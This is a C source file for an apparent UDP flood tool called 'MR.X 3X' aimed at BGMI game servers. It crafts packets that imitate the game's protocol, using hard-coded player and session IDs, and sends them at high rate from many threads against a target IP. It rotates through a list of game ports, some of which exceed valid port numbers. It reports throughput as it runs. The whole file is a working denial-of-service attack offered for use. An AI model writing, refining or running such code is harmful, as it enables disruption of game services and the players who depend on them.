#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/time.h>

#define BUFFER_ROTATION 8
#define PRE_ALLOC_COUNT 200000

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile int running = 1;
unsigned long long *second_packets = NULL;
int current_second = 0;

char **packet_pool = NULL;

typedef struct {
    uint32_t magic;
    uint32_t type_length;
    uint32_t sequence;
    uint32_t timestamp;
    uint64_t player_id;
    uint64_t session_id;
    uint8_t game_data[32];
    uint16_t checksum;
} __attribute__((packed)) bgmi_packet_t;

struct {
    uint64_t player_id;
    uint64_t session_id;
} valid_combinations[] = {
    {12343765738325288ULL, 5003905726975568877ULL},
    {70868798294852904ULL, 51381156466ULL},
    {13791636392117544ULL, 5229430348ULL},
    {74971778744334500ULL, 5207217259ULL},
    {13140100657841448ULL, 5219550043ULL}
};

void create_bgmi_packet(char *buffer, int size, int packet_type) {
    bgmi_packet_t *pkt = (bgmi_packet_t*)buffer;
    static uint32_t seq = 1000000;
    
    pkt->magic = htonl(0x47534D55);
    pkt->type_length = htonl((packet_type << 16) | size);
    pkt->sequence = htonl(seq++);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    pkt->timestamp = htonl((tv.tv_sec * 1000) + (tv.tv_usec / 1000));
    
    int combo_index = rand() % 5;
    pkt->player_id = valid_combinations[combo_index].player_id;
    pkt->session_id = valid_combinations[combo_index].session_id;
    
    memset(pkt->game_data, 0, 32);
    
    if(packet_type == 1) {
        pkt->game_data[0] = rand() % 100;
        pkt->game_data[4] = rand() % 100;
        pkt->game_data[8] = rand() % 100;
        pkt->game_data[12] = rand() % 360;
    } else if(packet_type == 2) {
        pkt->game_data[0] = 1;
        pkt->game_data[4] = rand() % 30;
        pkt->game_data[8] = rand() % 100;
        pkt->game_data[12] = rand() % 100;
    } else if(packet_type == 3) {
        strncpy((char*)pkt->game_data, "TEST", 4);
    } else {
        for(int i = 0; i < 32; i++) {
            pkt->game_data[i] = rand() % 256;
        }
    }
    
    uint16_t sum = 0;
    for(int i = 0; i < size - 2; i++) {
        sum += buffer[i];
    }
    pkt->checksum = sum;
}

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    int packet_types[] = {1, 2, 3, 4, 5};
    
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        create_bgmi_packet(packet_pool[i], PACKET_SIZE, packet_types[rand() % 5]);
        mlock(packet_pool[i], PACKET_SIZE);
    }
    
    second_packets = malloc((DURATION_TIME + 2) * sizeof(unsigned long long));
    memset(second_packets, 0, (DURATION_TIME + 2) * sizeof(unsigned long long));
}

void cleanup_pool() {
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        if(packet_pool[i]) free(packet_pool[i]);
    }
    free(packet_pool);
    if(second_packets) free(second_packets);
}

void *pps_monitor(void *arg) {
    unsigned long long last_total = 0;
    time_t start = time(NULL);
    time_t last_second = start;
    int second_count = 0;
    
    printf("\n🔥 MR.X 3X STARTED 🔥\n");
    printf("Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("Time: %ds | Size: %d | Threads: %d\n\n", DURATION_TIME, PACKET_SIZE, THREAD_COUNT);
    
    while (running) {
        sleep(1);
        second_count++;
        time_t now = time(NULL);
        
        if(now > last_second) {
            unsigned long long current_total = total_packets;
            unsigned long long pps = current_total - last_total;
            second_packets[second_count] = pps;
            
            double mbps = (pps * (PACKET_SIZE + 28) * 8.0) / 1000000.0;
            double gb_this_second = mbps / 1024.0;
            double total_gb_so_far = 0;
            
            for(int i = 1; i <= second_count; i++) {
                double sec_mbps = (second_packets[i] * (PACKET_SIZE + 28) * 8.0) / 1000000.0;
                total_gb_so_far += sec_mbps / 1024.0;
            }
            
            printf("[%ds] 🚀PPS: %.0fK | Pk: %.1fM | Mb: %.0f | Data: %.2fGB\n",
                   second_count,
                   pps/1000.0,
                   current_total/1000000.0,
                   mbps,
                   total_gb_so_far);
            
            last_total = current_total;
            last_second = now;
        }
    }
    return NULL;
}

void *send_bgmi_packets(void *arg) {
    int socks[BUFFER_ROTATION];
    struct sockaddr_in servaddr;
    time_t start_time = time(NULL);
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        int broadcast = 1;
        int sndbuf = 100 * 1024 * 1024;
        int reuse = 1;
        
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
        
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
        
        struct sockaddr_in local_addr;
        memset(&local_addr, 0, sizeof(local_addr));
        local_addr.sin_family = AF_INET;
        local_addr.sin_addr.s_addr = INADDR_ANY;
        local_addr.sin_port = htons(1024 + (rand() % 64512));
        bind(socks[s], (struct sockaddr*)&local_addr, sizeof(local_addr));
    }
    
    int local_pool_index = (int)(long)arg % PRE_ALLOC_COUNT;
    int socket_rotate = 0;
    unsigned long long local_packets = 0;
    
    int bgmi_ports[] = {13751, 35419, 50039, 70868, 74971, 10000, 20000};
    int port_index = 0;
    
    while (running && (time(NULL) - start_time) < DURATION_TIME) {
        if(local_packets % 1000 == 0) {
            servaddr.sin_port = htons(bgmi_ports[port_index % 7]);
            port_index++;
        }
        
        for(int burst = 0; burst < 1000 && running; burst++) {
            int sock_idx = socket_rotate % BUFFER_ROTATION;
            
            sendto(socks[sock_idx], 
                   packet_pool[local_pool_index], 
                   PACKET_SIZE, 
                   MSG_DONTWAIT,
                   (struct sockaddr *)&servaddr, 
                   sizeof(servaddr));
            
            local_packets++;
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
        }
        
        usleep(100);
        
        if(local_packets >= 5000) {
            __sync_fetch_and_add(&total_packets, local_packets);
            local_packets = 0;
        }
    }
    
    if(local_packets > 0) {
        __sync_fetch_and_add(&total_packets, local_packets);
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        if(socks[s] > 0) close(socks[s]);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    srand(time(NULL));
    init_packet_pool();

    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_bgmi_packets, (void*)(long)i);
        usleep(50000);
    }

    sleep(DURATION_TIME);
    running = 0;
    
    for (int j = 0; j < THREAD_COUNT; j++) {
        pthread_join(threads[j], NULL);
    }

    pthread_join(monitor_thread, NULL);
    
    unsigned long long total = total_packets;
    unsigned long long avg_pps = total / DURATION_TIME;
    
    double total_mbps = (total * (PACKET_SIZE + 28) * 8.0) / 1000000.0;
    double total_gb = total_mbps / 1024.0;
    
    printf("\n🔥 MR.X Completed 🔥\n");
    printf("Avg PPS: %.0fK | Total Pkts: %.1fM | Total Data: %.2fGB\n",
           avg_pps/1000.0,
           total/1000000.0,
           total_gb);
    
    cleanup_pool();
    free(threads);
    
    return 0;
}